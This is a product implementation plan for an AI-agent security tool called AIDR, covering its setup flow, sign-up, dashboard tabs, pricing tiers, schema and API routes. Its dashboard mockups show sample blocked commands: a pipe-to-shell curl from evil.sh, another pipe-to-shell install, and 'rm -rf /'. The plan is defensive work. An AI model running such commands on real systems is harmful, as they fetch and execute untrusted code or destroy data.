# AIDR Dashboard & Auth Flow - Detailed Implementation Plan

## 🎯 Kullanıcı Journey: npx aidr-setup → Dashboard

### Phase 1: One-Command Setup (30 saniye)

```bash
$ npx aidr-setup

🛡️  Singularity AIDR Setup

[1/5] Detecting environment...        ✓ Claude Code found
[2/5] Creating config...              ✓ ~/.singularity-aidr/config.json
[3/5] Installing hooks...            ✓ Claude Code integrated
[4/5] Loading threat database...     ✓ 150 rules active
[5/5] Testing protection...          ✓ AIDR is working!

🎉 Setup complete! 

┌─────────────────────────────────────┐
│  Next steps:                        │
│  1. Create account (optional)      │
│  2. View dashboard: aidr dashboard │
│  3. Start using Claude Code        │
│                                    │
│  Free tier: 100 calls/day active   │
└─────────────────────────────────────┘

[Create Account] [Open Dashboard] [Skip for now]
```

**Kullanıcı Seçenekleri:**
1. **Create Account** → Auth flow başlar
2. **Open Dashboard** → Local dashboard açılır (no auth required)
3. **Skip for now** → Anonymous mode, 100 call/gün

---

## Phase 2: Auth Flow (E-posta / OAuth)

### 2A. Anonymous Mode (Default)
```typescript
// No auth required for basic protection
interface AnonymousSession {
  sessionId: string;  // UUID
  tier: "anonymous";  // Limited features
  dailyQuota: 100;
  currentUsage: 0;
  createdAt: Date;
}
```

**Limitations:**
- 100 tool calls/day (IP-based tracking)
- 7-day log retention
- No team features
- No cloud dashboard
- Local CLI only

### 2B. Registered User Flow

**Step 1: Email Signup**
```
┌─────────────────────────────────────┐
│  Create Your AIDR Account           │
│  ─────────────────────────────────  │
│                                     │
│  Email: [________________]         │
│                                     │
│  [Continue with Email]             │
│  ─────── OR ───────                  │
│  [Continue with GitHub]              │
│  [Continue with Google]              │
│                                     │
│  Already have account? [Sign In]     │
└─────────────────────────────────────┘
```

**Step 2: Verify Email**
```
📧 Check your email!

We sent a verification link to:
anil@example.com

[Open Email App] [Resend (60s)]
```

**Step 3: Welcome + Free Tier Activation**
```
🎉 Welcome to AIDR!

Your free tier is now active:
✓ 1 project with 100 calls/day
✓ Basic threat detection
✓ Local dashboard
✓ 7-day log history

Upgrade anytime for:
• Unlimited calls
• Real-time CVE feed
• MITRE ATT&CK mapping
• Extra agents ($3/mo)

[Go to Dashboard] [Explore Features]
```

---

## Phase 3: Dashboard Architecture

### Dashboard Types

#### A. Local Dashboard (Default - No Auth)
**URL:** `http://localhost:3001` (aidr dashboard komutu)
**Features:**
- Real-time activity feed
- Local config management
- Basic stats (last 7 days)
- Export logs

#### B. Cloud Dashboard (Auth Required)
**URL:** `https://app.aidr.security`
**Features:**
- All local features +
- Multi-device sync
- Team management
- Billing & usage
- Advanced analytics

---

## Dashboard Layout & Components

### Main Dashboard Structure

```
┌────────────────────────────────────────────────────────────┐
│  🛡️ AIDR Dashboard    [Project: my-app]    [User] ▼       │
├────────────────────────────────────────────────────────────┤
│  ┌─────────────────┐  ┌─────────────────┐  ┌───────────────┐  │
│  │ Security Score  │  │ Today's Usage   │  │ Threat Level│  │
│  │    A+ 🟢        │  │   67/100 🟡    │  │   LOW 🟢    │  │
│  │                 │  │   ████████░░░   │  │             │  │
│  └─────────────────┘  └─────────────────┘  └───────────────┘  │
├────────────────────────────────────────────────────────────┤
│  TABS: [Overview] [Activity] [Threats] [Agents] [Settings]│
├────────────────────────────────────────────────────────────┤
│  TAB CONTENT AREA                                          │
│  ┌───────────────────────────────────────────────────────┐  │
│  │                                                       │  │
│  │  (Content changes based on selected tab)             │  │
│  │                                                       │  │
│  └───────────────────────────────────────────────────────┘  │
└────────────────────────────────────────────────────────────┘
```

---

## Tab 1: Overview (Default)

### Real-time Activity Graph
```
Activity (Last 24 Hours)

Calls    50 │                    ╭─╮
          40 │         ╭─╮      │ │
          30 │    ╭─╮  │ │  ╭─╮ │ │
          20 │╭─╮ │ │  │ │  │ │ │ │
          10 ││ │ │ │  │ │  │ │ │ │
           0 └┴─┴─┴─┴──┴─┴──┴─┴─┴─┴──
             00 04 08 12 16 20 24
             
     ✅ 245 allowed  ⚠️ 12 warned  🚫 3 blocked
```

### Quick Stats Cards
```
┌─────────────────────────────────────────────────────────────┐
│  TODAY'S SUMMARY                                            │
├────────────────┬────────────────┬─────────────────────────────┤
│  🟢 Safe       │  🟡 Cautious   │  🔴 Blocked                │
│  245 calls     │  12 alerts     │  3 threats                 │
│  94% of total  │  5% of total   │  1% of total               │
└────────────────┴────────────────┴─────────────────────────────┘
```

### Active Protection Status
```
Protection Modules          Status
────────────────────────────────────────
🛡️  Threat Detection         ✅ Active (150 rules)
🔍  Behavioral Analysis       ⭐ Pro Feature
📊  MITRE ATT&CK Mapping     ⭐ Pro Feature  
🚨  NVD CVE Feed             ⭐ Pro Feature
🔒  DLP/Entropy Check        ⭐ Pro Feature

[Upgrade to Pro] - Unlock all features
```

---

## Tab 2: Activity Feed

### Real-time Log Stream
```
Recent Tool Calls (Auto-updating)
────────────────────────────────────────────────────────

✅ 14:32:15  Bash        ls -la                    [Allow]
✅ 14:32:10  Read        ~/.bashrc                 [Allow]
⚠️ 14:28:45  Bash        curl install.sh | bash    [Ask → User Approved]
  └─ Why: Pipe-to-shell pattern (T1059)
  └─ Risk: Supply chain attack vector
  
🚫 14:15:22  Bash        rm -rf / --no-preserve    [BLOCKED]
  └─ Why: Destructive command pattern
  └─ Alternative: rm -rf ./specific-folder
  
✅ 14:10:01  Write       /tmp/test.txt            [Allow]

[Filter: All ▼] [Search...] [Export CSV]
```

### Detailed Log Entry
```typescript
interface ActivityLog {
  id: string;
  timestamp: Date;
  toolName: string;
  toolInput: Record<string, unknown>;
  decision: "allow" | "deny" | "ask";
  verdict: Verdict;
  userAction?: "approved" | "denied";
  mitreTechnique?: string; // T1059
  duration: number; // ms
  projectId: string;
}
```

---

## Tab 3: Threats

### Threat Overview
```
Blocked Threats (Last 30 Days)

By Category:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Command Execution    ████████████░░░  12  (T1059)
Data Exfiltration    ██████░░░░░░░░░   6  (T1567)
Credential Access    ███░░░░░░░░░░░░   3  (T1552)
Persistence          ██░░░░░░░░░░░░░   2  (T1574)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Total: 23 threats blocked
Confidence: 98.5% (low false positives)
```

### MITRE ATT&CK Timeline
```
ATT&CK Technique Timeline

T1059 ━━━━━━━━━━●━━━━━━●━━━━━━━━━━━━━━━━━━━  (3 incidents)
T1567 ━━━━━━━━━━━━━━━━●━━━━━━●━━━━━━━━━━━━━  (2 incidents)
T1552 ━━━━━━━━━━━━━━━━━━━━━━━━●━━━━━━━━━━━━━━  (1 incident)
      ──────────────────────────────────────
      Week 1    Week 2    Week 3    Week 4
```

### Threat Details Modal
```
┌────────────────────────────────────────────────────────────┐
│  🚫 Threat Blocked: T1059.004 - Unix Shell                 │
│  ─────────────────────────────────────────────────────────  │
│                                                             │
│  Command: curl https://evil.sh | bash                      │
│  Timestamp: 2026-03-30 14:28:45                            │
│  Project: my-app                                           │
│                                                             │
│  Why Blocked:                                               │
│  • Pipe-to-shell pattern detected                          │
│  • Domain not in trusted list                              │
│  • MITRE ATT&CK T1059.004                                  │
│                                                             │
│  Recommendation:                                             │
│  1. Download first: curl -o script.sh                       │
│  2. Review content: cat script.sh                          │
│  3. Execute manually: bash script.sh                         │
│                                                             │
│  [Mark as False Positive] [Add to Allowlist]               │
└────────────────────────────────────────────────────────────┘
```

---

## Tab 4: Agents (Team Management)

### Agent List (Pro/Enterprise)
```
Connected Agents

Agent Name          Status    Last Activity    Plan
─────────────────────────────────────────────────────────
💻 MacBook-Pro      🟢 Online  2 min ago       Pro
💻 Work-Desktop     🟢 Online  15 min ago      Pro  
💻 CI/CD Server     🟡 Away    2 hours ago     Enterprise
📱 Laptop-Personal  🟢 Online  5 min ago       Free
─────────────────────────────────────────────────────────

4 agents total
Base: 3 included (Pro plan)
Extra: 1 × $3 = $3/mo
─────────────────────────────────────────────────────────
Total: $12/month

[Add New Agent] [Manage Billing]
```

### Add Agent Flow
```
Add New Agent

1. Install AIDR on new machine:
   $ npx aidr-setup

2. Link to your account:
   $ aidr link --token=abcd1234

3. Or share this invite link:
   https://aidr.security/invite/abcd1234

[Copy Link] [Email Invite] [Generate QR]
```

---

## Tab 5: Settings

### General Settings
```
General
─────────────────────────────────────────────────────────

Project Name:     [my-app            ] [Save]
Sensitivity:      [Balanced      ▼]
                  • Balanced: 150 rules, medium alerts
                  • Paranoid: All rules, high alerts  
                  • Relaxed: Critical only

Mode:             [Local         ▼]
                  • Local: On-device processing
                  • Cloud: Enhanced with CVE feed

Auto-approve:     ☑️ Trusted commands after 3 approvals
                  ☑️ Whitelisted directories
                  ☐ Silent mode (no alerts)
```

### Feature Toggles (Tier-based)
```
Features & Limits
─────────────────────────────────────────────────────────

Core (Free)
☑️ Basic Threat Detection    Free forever
☑️ Local Cache               Free forever
☑️ Audit Logging             7 days retention

Pro Features ($9/mo)
⭐ Real-time CVE Feed        Upgrade to enable
⭐ MITRE ATT&CK Mapping      Upgrade to enable
⭐ Behavioral Analysis       Upgrade to enable
⭐ Advanced DLP              Upgrade to enable
☐ _________________________ [Upgrade to Pro]

Enterprise ($49/mo)
💎 Custom Rules              Contact sales
💎 API Access                Contact sales
💎 SSO Integration           Contact sales
💎 1-year Log Retention      Contact sales
☐ _________________________ [Contact Sales]
```

### Billing Section
```
Billing & Usage
─────────────────────────────────────────────────────────

Current Plan:     Pro ($9/month)
Billing Cycle:    Monthly (renews Apr 30)
Payment Method:   Visa •••• 4242 [Change]

This Month's Usage:
Base Plan:        $9.00
Extra Agents:     $6.00  (2 agents × $3)
─────────────────────────────────────────
Total:            $15.00

Usage Quota:      1,847 / Unlimited calls
                  ████████████████████░░░░░ 78%

[Download Invoice] [Cancel Plan] [Change Plan]
```

---

## Feature Matrix: Free vs Paid

| Feature | Free (Anonymous) | Free (Registered) | Pro ($9) | Enterprise ($49) |
|---------|------------------|-------------------|----------|------------------|
| **Tool Calls** | 100/day | 100/day | Unlimited | Unlimited |
| **Projects** | 1 | 1 | 3 | Unlimited |
| **Agents** | 1 | 1 | 3 + $3/extra | Unlimited + $2/extra |
| **Threat Rules** | 50 basic | 50 basic | 150+ | 150+ + custom |
| **MITRE Mapping** | ❌ | ❌ | ✅ | ✅ + STIX |
| **NVD CVE Feed** | ❌ | ❌ | ✅ | ✅ + EPSS |
| **Behavioral Analysis** | ❌ | ❌ | ✅ | ✅ + ML |
| **Log Retention** | 7 days | 7 days | 30 days | 1 year |
| **Cloud Dashboard** | ❌ | ✅ | ✅ | ✅ + SSO |
| **Team Management** | ❌ | ❌ | ✅ | ✅ + Roles |
| **API Access** | ❌ | ❌ | ❌ | ✅ |
| **Support** | Community | Community | Email | Priority |

---

## Upgrade Prompts (Smart Timing)

### 1. Quota Warning (80% usage)
```
┌────────────────────────────────────────────────────────┐
│  🎯 Daily Quota Alert                                  │
│                                                        │
│  You've used 80/100 free tool calls today (80%)       │
│                                                        │
│  Upgrade to Pro for unlimited calls:                  │
│  ✓ No daily limits                                    │
│  ✓ Real-time threat intelligence                      │
│  ✓ 3 agents included                                  │
│                                                        │
│  [Upgrade Now - $9/mo] [Remind Tomorrow]              │
└────────────────────────────────────────────────────────┘
```

### 2. Feature Teaser (When trying Pro feature)
```
⚠️  Pro Feature

MITRE ATT&CK mapping requires Pro plan.

See what you're missing:
• Technique IDs for compliance
• STIX 2.1 export
• Advanced threat categorization

[Start Free Trial] [Learn More]
```

### 3. Team Invite (When adding 2nd agent)
```
🤝 Team Feature

Adding more agents requires Pro plan.

Pro includes:
• 3 agents ($9/mo)
• Additional agents $3/mo each
• Team activity dashboard

[Upgrade for Team] [Stay Solo]
```

---

## Technical Implementation Notes

### Database Schema

```typescript
// User & Billing
interface User {
  id: string;
  email: string;
  tier: "free" | "pro" | "enterprise";
  stripeCustomerId?: string;
  stripeSubscriptionId?: string;
  createdAt: Date;
}

// Projects (1 free per user)
interface Project {
  id: string;
  userId: string;
  name: string;
  tier: "free" | "pro" | "enterprise";
  createdAt: Date;
}

// Agents (machines)
interface Agent {
  id: string;
  projectId: string;
  name: string;
  machineId: string; // hardware fingerprint
  lastSeen: Date;
  isActive: boolean;
}

// Usage tracking
interface UsageRecord {
  id: string;
  projectId: string;
  agentId: string;
  date: Date; // YYYY-MM-DD
  callCount: number;
  blockedCount: number;
}

// Activity logs
interface ActivityLog {
  id: string;
  agentId: string;
  projectId: string;
  timestamp: Date;
  toolName: string;
  decision: "allow" | "deny" | "ask";
  threatId?: string;
  mitreTechnique?: string;
}
```

### API Endpoints

```typescript
// Dashboard API
GET    /api/v1/dashboard/overview       // Stats, score, usage
GET    /api/v1/dashboard/activity        // Recent logs (paginated)
GET    /api/v1/dashboard/threats         // Threat summary
GET    /api/v1/dashboard/agents           // Connected agents

// Project management
GET    /api/v1/projects                  // List projects
POST   /api/v1/projects                // Create project
PATCH  /api/v1/projects/:id             // Update project
DELETE /api/v1/projects/:id             // Delete project

// Billing
GET    /api/v1/billing/usage            // Current usage
GET    /api/v1/billing/invoices         // Invoice history
POST   /api/v1/billing/upgrade          // Create checkout session
POST   /api/v1/billing/cancel           // Cancel subscription

// Agents
GET    /api/v1/agents                  // List agents
POST   /api/v1/agents/link             // Link new agent
DELETE /api/v1/agents/:id              // Remove agent
```

### Frontend Routes

```
/                    → Landing page
/login               → Auth page
/dashboard           → Main dashboard (redirects to /dashboard/overview)
/dashboard/overview  → Overview tab
/dashboard/activity  → Activity feed
/dashboard/threats   → Threat analysis
/dashboard/agents    → Team management
/dashboard/settings  → Configuration
/billing             → Billing & upgrade
/invite/:token       → Agent invitation accept
```

---

## Success Metrics

### Activation
- **Time to first protection**: <30 seconds (npx setup → working)
- **Account creation rate**: 30% of installs
- **Dashboard open rate**: 50% of users within 7 days

### Engagement
- **Daily active users (DAU)**: Users with ≥1 protected call
- **Avg calls per user**: Free: 45/day, Pro: 200+/day
- **Feature discovery**: % users who try Pro features

### Conversion
- **Free → Pro**: Target 5-8% conversion
- **Upgrade timing**: Avg 14 days after install
- **Churn rate**: Target <5% monthly

### Revenue
- **ARPU**: $12/mo (accounting for extra agents)
- **LTV**: $144 (12-month avg retention)
- **CAC**: <$30 (organic + content marketing)

---

## Implementation Priority

### P0: Core Experience (Week 1)
- [ ] npx aidr-setup command
- [ ] Local dashboard (CLI + web)
- [ ] Anonymous mode (100 calls/day)
- [ ] Basic activity feed

### P1: Auth & Billing (Week 2)
- [ ] Email + OAuth signup
- [ ] Stripe integration
- [ ] Free tier enforcement
- [ ] Upgrade flow

### P2: Dashboard v1 (Week 3)
- [ ] Overview tab
- [ ] Activity feed with filters
- [ ] Threat summary
- [ ] Settings panel

### P3: Team Features (Week 4)
- [ ] Multi-agent support
- [ ] Agent invitation flow
- [ ] Team activity view
- [ ] Usage-based billing

### P4: Advanced (Week 5-6)
- [ ] MITRE ATT&CK visualization
- [ ] Real-time CVE feed
- [ ] Behavioral analysis UI
- [ ] API access (Enterprise)

---

## Open Questions

1. **Anonymous tracking**: IP-based or fingerprint-based?
2. **Local dashboard**: Build-in or separate package?
3. **Real-time updates**: WebSocket or polling?
4. **Offline mode**: How to handle no internet?
5. **Data residency**: EU users → EU servers?

---

**Plan Status**: Ready for implementation
**Next Step**: /start-work to begin implementation
